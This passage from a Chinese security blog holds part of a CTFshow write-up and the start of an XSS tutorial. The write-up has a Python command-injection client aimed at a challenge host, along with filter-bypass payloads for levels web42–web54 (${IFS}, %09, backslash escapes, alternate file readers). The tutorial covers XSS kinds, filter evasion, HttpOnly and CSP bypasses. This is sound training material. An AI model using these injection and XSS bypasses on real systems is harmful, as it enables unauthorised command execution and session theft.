<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&quot;http://df47b3bc-3ef6-4727-b8c9-a6f8578f8944.challenge.ctf.show/&quot;</span></span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/2022/03/08/CTFshow/image-20220127212157187.png" alt="image-20220127212157187"></p>
<p><img src="/2022/03/08/CTFshow/image-20220127212204564.png" alt="image-20220127212204564"></p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><img src="/2022/03/08/CTFshow/image-20220127221626111.png" alt="image-20220127221626111"></p>
<p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p>
<p><strong>1、可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>2、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>那么:</strong><br>1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 </p>
<p>3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 </p>
<p>下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。<br>dd if=/dev/zero of=file count=10 bs=1024</p>
<p> shell中可能经常能看到：<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">&gt;/dev/null 2&gt;&amp;1</a> </p>
<p>命令的结果可以通过%&gt;的形式来定义输出</p>
<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。</p>
<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”</p>
<p><strong>因此，&gt;<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">/dev/null 2&gt;&amp;1</a> 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>

<p>payload : ?c=cat flag.php;    ?c=cat flag.php||</p>
<p>再查看源代码</p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p><img src="/2022/03/08/CTFshow/image-20220127223234161.png" alt="image-20220127223234161"></p>
<p>过滤了分号和cat</p>
<p>payload:?c=tac flag.php||</p>
<p>补充：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似</span><br><span class="line"><span class="symbol">head:</span>查看头几行</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看</span><br><span class="line"><span class="symbol">sort:</span>可以查看</span><br><span class="line"><span class="symbol">uniq:</span>可以查看，uniq用于重复数据处理,使用前先sort排序。</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep 用于查找文件里符合条件的字符串。</span><br><span class="line">strings</span><br><span class="line">paste 可以查看文件，从指定的文件中读取输入，从一个或多个文件中连接行</span><br></pre></td></tr></table></figure>

<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="/2022/03/08/CTFshow/image-20220127223555173.png" alt="image-20220127223555173"></p>
<p>payload:?c=tac fla*.php||</p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p><img src="/2022/03/08/CTFshow/image-20220127223755217.png" alt="image-20220127223755217"></p>
<p>多过滤了空格</p>
<p><strong>空格绕过</strong></p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%<span class="number">09</span>`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$<span class="number">9</span>`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%<span class="number">20</span>`</span><br><span class="line">`%<span class="number">09</span></span><br></pre></td></tr></table></figure>

<p>payload：?c=tac%09fla*.php||</p>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p><img src="/2022/03/08/CTFshow/image-20220127224459611.png" alt="image-20220127224459611"></p>
<p>多过滤了数字，$，*等</p>
<p>*可以用？代替，空格可用%09  ，因为%09是编码，浏览器对他自动解码为一个水平制表符，而不是为数字</p>
<p>payload:?c=tac%09fla?.php||</p>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p><img src="/2022/03/08/CTFshow/image-20220127225946719.png" alt="image-20220127225946719"></p>
<p>payload: ?c=tac%09fla?.php||</p>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="/2022/03/08/CTFshow/image-20220127230657232.png" alt="image-20220127230657232"></p>
<p>payload: ?c=tac%09fla?.php||</p>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="/2022/03/08/CTFshow/image-20220128211059961.png" alt="image-20220128211059961"></p>
<p>payload: ?c=tac%09fla?.php||</p>
<p>因为%09是编码，浏览器对他自动解码为一个水平制表符，而不是为数字，也不是%</p>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="/2022/03/08/CTFshow/image-20220128215058673.png" alt="image-20220128215058673"></p>
<p>%09 %26被过滤了 使用重定向符&lt;&gt;代替空格，，但是&lt;&gt;后面不能跟有通配符，&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替,我们通过反斜杠<code>\</code>来绕过过滤的flag<img src="/2022/03/08/CTFshow/image-20220128220043797.png" alt="image-20220128220043797"></p>
<p>payload:?c=tac&lt;&gt;fla\g.php||</p>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="/2022/03/08/CTFshow/image-20220128220619948.png" alt="image-20220128220619948"></p>
<p>tac也被过滤了</p>
<p>使用反斜杠<code>\</code>绕过,或者利用<code>nl</code>替代<code>tac</code>，nl 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。 </p>
<p>payload：?c=ta\c&lt;&gt;fla\g.php||   或者 ?c=nl&lt;&gt;fla\g.php|| 查看网页源代码</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="/2022/03/08/CTFshow/image-20220128221324732.png" alt="image-20220128221324732"></p>
<p>也过滤了重定向符，没过滤$</p>
<p>?c=ta\c${IFS}fla\g.php||   或  ?c=nl${IFS}fla\g.php||</p>
<p><img src="/2022/03/08/CTFshow/image-20220128221645044.png" alt="image-20220128221645044"></p>
<p>但是是假的</p>
<p>看下根目录文件   ?c=ls${IFS}/||   <img src="/2022/03/08/CTFshow/image-20220128221925099.png" alt="image-20220128221925099"></p>
<p>读取即可   ?c=nl${IFS}/fla\g||    ?c=ca\t${IFS}/fla\g||</p>
<p>  <img src="/2022/03/08/CTFshow/image-20220128222111942.png" alt="image-20220128222111942"></p>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="/2022/03/08/CTFshow/image-20220129115224616.png" alt="image-20220129115224616"></p>
<p>payload : ?c=ca\t${IFS}fla\g.php</p>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p><img src="/2022/03/08/CTFshow/image-20220129115722029.png" alt="image-20220129115722029"></p>
<p>?c=ls${IFS} 得到</p>
<p><img src="/2022/03/08/CTFshow/image-20220129120340261.png" alt="image-20220129120340261"></p>
<p>过滤了;|cat|flag|空格|数字|查看文件命令nl等|`|%|\x09(空格)|\x26(&amp;)|&lt;|&gt;</p>
<p>payload :  ?c=paste${IFS}fla?.php</p>
<p>?c=grep${IFS}%27</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/08/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/08/XSS/" class="post-title-link" itemprop="url">XSS</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-08 17:02:01" itemprop="dateCreated datePublished" datetime="2022-03-08T17:02:01+08:00">2022-03-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-24 23:32:04" itemprop="dateModified" datetime="2022-03-24T23:32:04+08:00">2022-03-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>5.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>跨站脚本攻击(Cross Site Scripting，为避免与层叠样式表CSS混淆，通常简称为XSS)是一种网站应用程序的安全漏洞，是代码注入漏洞的一种。它使得攻击者可以通过巧妙的方法向网页中注入恶意代码，导致用户浏览器在加载网页、渲染HTML文档时就会执行攻击者的恶意代码。大量的网站曾遭受过XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、新浪微博和百度贴吧等。根据OWASP (Open WebApplication Security Project)公布的2010年的统计数据，在Web安全威胁前10位中，XSS排名第2，仅次于SQL注入攻击漏洞。近年的CTF比赛中，XSS漏洞也很常见，如在Alibaba CTF2015、HCTF 2016中均有相关题目。</p>
<h2 id="0x02-XSS漏洞分类"><a href="#0x02-XSS漏洞分类" class="headerlink" title="0x02 XSS漏洞分类"></a>0x02 XSS漏洞分类</h2><p>按漏洞成因，一般可以把XSS漏洞分为反射型、存储型、DOM型。<br>基于上述三种XSS类型，还可以根据输出点的不同，依照输出点的位置分成3类，具体如下。<br>·输出在HTML属性中。<br>·输出在CSS代码中。<br>·输出在JavaScript中。<br>下面将分别为大家介绍这几种类型。</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/2022/03/08/XSS/image-20220308171002038.png" alt="image-20220308171002038"></p>
<p><img src="/2022/03/08/XSS/image-20220308171023298.png" alt="image-20220308171023298"></p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS与反射型XSS的区别主要在于提交的XSS代码是否会存储在服务端，下次请求该网页时是否需要再次提交XSS代码。存储型XSS的典型应用有留言板、在线聊天室、邮件服务等，攻击者提交包含XSS代码的留言后，服务端会将其存储于数据库中，其他用户访问网页查看留言时，服务端将从数据库中查询已有留言并将留言内容输出在HTTP响应中，由浏览器对包含恶意代码的响应进行解析执行。原型如下:</p>
<p><img src="/2022/03/08/XSS/image-20220308171218524.png" alt="image-20220308171218524"></p>
<p><img src="/2022/03/08/XSS/image-20220308171235127.png" alt="image-20220308171235127"></p>
<p>攻击者提交留言</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后，服务端存储留言，其他用户访问网页时执行恶意代码，如图3-2所示。</p>
<p><img src="/2022/03/08/XSS/image-20220308171338735.png" alt="image-20220308171338735"></p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS与反射型XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。原型如下:<img src="/2022/03/08/XSS/image-20220308171441508.png" alt="image-20220308171441508"></p>
<p><img src="/2022/03/08/XSS/image-20220308171545059.png" alt="image-20220308171545059"></p>
<h3 id="输出在HTML标签中"><a href="#输出在HTML标签中" class="headerlink" title="输出在HTML标签中"></a>输出在HTML标签中</h3><p><img src="/2022/03/08/XSS/image-20220308171639510.png" alt="image-20220308171639510"></p>
<p>XSS攻击Payload输出在HTML属性中时，攻击者需要在闭合相应的HTML属性后注入新属性，或者在闭合标签后直接注入新标签，如输入:</p>
<p><img src="/2022/03/08/XSS/image-20220308171817149.png" alt="image-20220308171817149"></p>
<h3 id="输出在CSS代码中"><a href="#输出在CSS代码中" class="headerlink" title="输出在CSS代码中"></a>输出在CSS代码中</h3><p>原型如下：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line"><span class="attribute">color</span>: &#123;&#123;your input &#125;&#125;：</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>XSS攻击Payload输出在CSS代码中时，攻击者需要闭合相应的CSS代码，如输入:</p>
<p><img src="/2022/03/08/XSS/image-20220308172241695.png" alt="image-20220308172241695"></p>
<h3 id="输出在JavaScript代码中"><a href="#输出在JavaScript代码中" class="headerlink" title="输出在JavaScript代码中"></a>输出在JavaScript代码中</h3><p><img src="/2022/03/08/XSS/image-20220308172340868.png" alt="image-20220308172340868"></p>
<p><img src="/2022/03/08/XSS/image-20220308172355085.png" alt="image-20220308172355085"></p>
<h2 id="0x03-防护与绕过"><a href="#0x03-防护与绕过" class="headerlink" title="0x03 防护与绕过"></a>0x03 防护与绕过</h2><h3 id="特定标签过滤"><a href="#特定标签过滤" class="headerlink" title="特定标签过滤"></a>特定标签过滤</h3><p>部分开发者认为过滤掉危险标签(如script、iframe等)就会导致无法执行脚本，但其实任何一种标签，无论是否合法，都可以构造出XSS代码，比如如下代码:</p>
<p><img src="/2022/03/08/XSS/image-20220308172611656.png" alt="image-20220308172611656"></p>
<p>这段代码在用户点击时也会执行XSS代码。<br>如果输出点在HTML标签的属性中或在Javascript代码中，那么攻击者可以简单地闭合、拼接属性或Javascript代码而不需要引入任何新标签就可以执行XSS代码。</p>
<p><img src="/2022/03/08/XSS/image-20220308172709657.png" alt="image-20220308172709657"></p>
<h3 id="事件过滤"><a href="#事件过滤" class="headerlink" title="事件过滤"></a>事件过滤</h3><p>很多时候，开发者会过滤掉许多HTML标签的事件属性，这时需要对所有可利用的事件属性进行遍历，测试一下开发者是否有所遗漏。常用的事件属性如下，测试时可使用Burp或自行编写脚本进行Fuzz:</p>
<p><img src="/2022/03/08/XSS/image-20220308172848719.png" alt="image-20220308172848719"></p>
<p><img src="/2022/03/08/XSS/image-20220308172912033.png" alt="image-20220308172912033"></p>
<h3 id="敏感关键字（字符）过滤"><a href="#敏感关键字（字符）过滤" class="headerlink" title="敏感关键字（字符）过滤"></a>敏感关键字（字符）过滤</h3><p>关键字过滤大部分是针对敏感变量或函数而进行的，如cookie、eval等，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过。</p>
<p><img src="/2022/03/08/XSS/image-20220308173037728.png" alt="image-20220308173037728"></p>
<p><strong>(2)编码解码</strong><br>基于字符串的代码混淆不仅可以通过字符串拼接的方式来实现，还可以通过各种编码、解码来实现。XSS漏洞中常用的编码方式包括:</p>
<p><img src="/2022/03/08/XSS/image-20220308173232833.png" alt="image-20220308173232833"></p>
<p><img src="/2022/03/08/XSS/image-20220308173322128.png" alt="image-20220308173322128"></p>
<p>(3)location.*、window.name</p>
<p><img src="/2022/03/08/XSS/image-20220308173652494.png" alt="image-20220308173652494"></p>
<p>(4)过滤 “.”</p>
<p><img src="/2022/03/08/XSS/image-20220308173914245.png" alt="image-20220308173914245"></p>
<p>(5)过滤”()”</p>
<p><img src="/2022/03/08/XSS/image-20220308173950089.png" alt="image-20220308173950089"></p>
<p>(6)过滤空格</p>
<p><img src="/2022/03/08/XSS/image-20220308174030229.png" alt="image-20220308174030229"></p>
<p><img src="/2022/03/08/XSS/image-20220308174038394.png" alt="image-20220308174038394"></p>
<p>(7)svg标签</p>
<p><img src="/2022/03/08/XSS/image-20220308174124585.png" alt="image-20220308174124585"></p>
<h3 id="字符集编码导致的绕过"><a href="#字符集编码导致的绕过" class="headerlink" title="字符集编码导致的绕过"></a>字符集编码导致的绕过</h3><p>(1)古老的UTF-7与US-ASCII</p>
<p>在没有通过Content-Type或meta标签设置字符集时，如果lE的编码设置为自动检测，那么它会根据一些BOM字符来判断当前的字符集(现在已不适用)，如:</p>
<p><img src="/2022/03/08/XSS/image-20220308174349478.png" alt="image-20220308174349478"></p>
<p>另外一种情况是，虽然IE没有勾选自动检测字符集的设置，但可以通过制作一个字符集为UTF-7的页面，并使用iframe标签来调用目标页面，利用字符集继承漏洞来实现字符集的设定，如:</p>
<p><img src="/2022/03/08/XSS/image-20220308174447774.png" alt="image-20220308174447774"></p>
<p>如果输出点是在title标签之内，meta标签之前，且字符集是由meta标签所指定的，那么仍可通过如下方式注入meta标签指定字符集来利用XSS漏洞，原型如下:</p>
<p><img src="/2022/03/08/XSS/image-20220308174527318.png" alt="image-20220308174527318"></p>
<p><img src="/2022/03/08/XSS/image-20220308174625714.png" alt="image-20220308174625714"></p>
<p><img src="/2022/03/08/XSS/image-20220308174703480.png" alt="image-20220308174703480"></p>
<p>(2)宽字节</p>
<p><img src="/2022/03/08/XSS/image-20220308174815882.png" alt="image-20220308174815882"></p>
<p>(3)一些特殊的字符</p>
<p>由于字符集的原因，在浏览器中会出现如下几种情况。</p>
<p>特定的byte最后会变成特别的字符。</p>
<p>·特定的byte会破坏紧随其后的文字。</p>
<p>·特定的byte会被忽略。</p>
<p><img src="/2022/03/08/XSS/image-20220308175056839.png" alt="image-20220308175056839"></p>
<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p>部分输入点会限制输入字符的数量，这时就需要使XSS代码尽量短小精悍，可使用如下方式:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">window</span>.name</span><br><span class="line"><span class="keyword">location</span>.*</span><br></pre></td></tr></table></figure>

<p>window.name和location.*都可以通过将代码放置在别处以减小输<br>入点代码量，如:</p>
<p><img src="/2022/03/08/XSS/image-20220310141019174.png" alt="image-20220310141019174"></p>
<h3 id="HttpOnly绕过"><a href="#HttpOnly绕过" class="headerlink" title="HttpOnly绕过"></a>HttpOnly绕过</h3><p>HttpOnly是Cookie的一个安全属性，设置后则可以在XSS漏洞发生时避免JavaScript读取到Cookie，但即使设置了HttpOnly属性，也仍有方法获取到Cookie值。</p>
<p>(1) CVE-2012-0053<br>Apache服务器2.2.0-2.2.21版本存在一个漏洞CVE-2012-0053:攻击者可通过向网站植入超大的Cookie，令其HTTP头超过Apache的LimitRequestFieldSize(最大请求长度,4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly保护的Cookie。<br>源代码可参见: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/18442/%E3%80%82">https://www.exploit-db.com/exploits/18442/。</a><br>除了Apache，一些其他的Web服务器在使用者不了解其特性的情况下，也很容易出现HttpOnly保护的Cookie被爆出的情况，例如Squid等。</p>
<p>(2) PHPINFO页面<br>无论是否设置了HtpOnly属性,phpinfo()函数都会输出当前请求上下文的Cookie信息。如果目标网站存在PHPINFO页面，就可以通过XMLHttpRequest请求该页面获取Cookie信息。</p>
<p>(3)Flash/Java<br>安全团队seckb在2012年提出，通过Flash、Java的一些API可以获取到HttpOnly Cookie，这种情况可以归结为客户端的信息泄露，链接地址为: </p>
<p><a target="_blank" rel="noopener" href="http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html">http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html</a></p>
<h3 id="XSS-Auditor绕过"><a href="#XSS-Auditor绕过" class="headerlink" title="XSS Auditor绕过"></a>XSS Auditor绕过</h3><p>反射型XSS漏洞作为一种最容易发现和挖掘的XSS漏洞，从被发现至今已经活跃了非常长的时间。但是由于浏览器的XSS Auditor的出现，使反射型XSS漏洞的作用被逐步弱化。XSS Auditor通过检查输入的内容，判断该内容是否在输出中出现。如果符合XSS Auditor的过滤条件，则会直接阻止脚本执行，如图3-5所示。<img src="/2022/03/08/XSS/image-20220310141557026.png" alt="image-20220310141557026"></p>
<p>然而安全人员的研究表明，XSS Auditor同样可以被绕过。<br>·字符集编码导致的绕过。正如前文所言，在一定场景下，字符集编码可能会导致XSS过滤的绕过，在XSS Auditor中也是一样。<br>由于低版本Chrome浏览器对ISO-2022-JP等编码处理不当，在页面没有设置默认编码并使用这个日语字符集时，XSS Auditor检查的部分会向Payload添加0x0f字符，这样就可以绕过XSS Auditor。xSS代码如下:</p>
<p><img src="/2022/03/08/XSS/image-20220310141759355.png" alt="image-20220310141759355"></p>
<p>这其实是利用了浏览器处理字符集时产生的漏洞，随着以后字符集的更新，这种漏洞仍然有可能出现。<br>·协议理解问题导致的绕过。协议理解问题也会导致Chrome浏览器的XSS Auditor被绕过，因为XSS Auditor在检查加载脚本的路径时有一个比较有趣的地方:如果加载的脚本在自身目录下，并且XSS的输出点在HTML属性中，那么XSS Auditor是不会对其进行拦截的。但是如果检测到了“//”这样的外部链接的话，就会触发Auditor，从而无法加载外部脚本。<br>结合XSS Auditor对HTTPS协议的错误理解，可以构造如下XSS代码绕过XSS Auditor:</p>
<p><img src="/2022/03/08/XSS/image-20220310142101801.png" alt="image-20220310142101801"></p>
<p>CRLF导致的绕过。Chrome浏览器的XSS Auditor默认是开启的，但如果HTTP响应头中的X-XSS-Protection属性被设置为0，那么Chrome浏览器会关闭XSS Auditor。因此，如果在HTTP响应头中注入<br>CRLF并在新一行中写入X-XSS-Protection:0，那么接下来的XSS代码将不再受到XSS Auditor的拦截。</p>
<h3 id="内容安全策略（CSP-绕过"><a href="#内容安全策略（CSP-绕过" class="headerlink" title="内容安全策略（CSP)绕过"></a>内容安全策略（CSP)绕过</h3><p>内容安全策略（CSP）是目前最主要的Web安全保护机制之一，这个功能可以有效地帮助开发者降低网站遭受XSS漏洞攻击的可能性。得益于CSP，开发者可以创建并强制部署一些安全管理规则，并规定网站可以获取或加载的内容。<br>内容安全策略以白名单的机制来管理网站要加载或执行的资源。在网页中，这样的策略是通过HTTP头信息或者meta标签来定义的。需要注意的是，虽然这个策略可以防止攻击者从外部网站跨域加载恶意代码，但是CSP并不能防止数据泄露。目前已经有很多安全研究人员提出了各种各样的技术来绕过内容安全策略，并利用该技术从目标网站中提取出所需数据。</p>
<p>(1)CSP配置错误<br>在实际场景中，常常会出现CSP策略配置错误的情形，错误场景列举如下。</p>
<p>策略定义不全或未使用default-src来补全。<br>script-src的源列表包含unsafe-inline (并且没有使用nonce或hash策略)或允许data伪协议。<br>script-src或object-src源列表包含攻击者可控制的部分源地址(文件上传、JSON Hijacking、SOME攻击)，或者包含不安全的库。<br>·源地址列表滥用通配符。…</p>
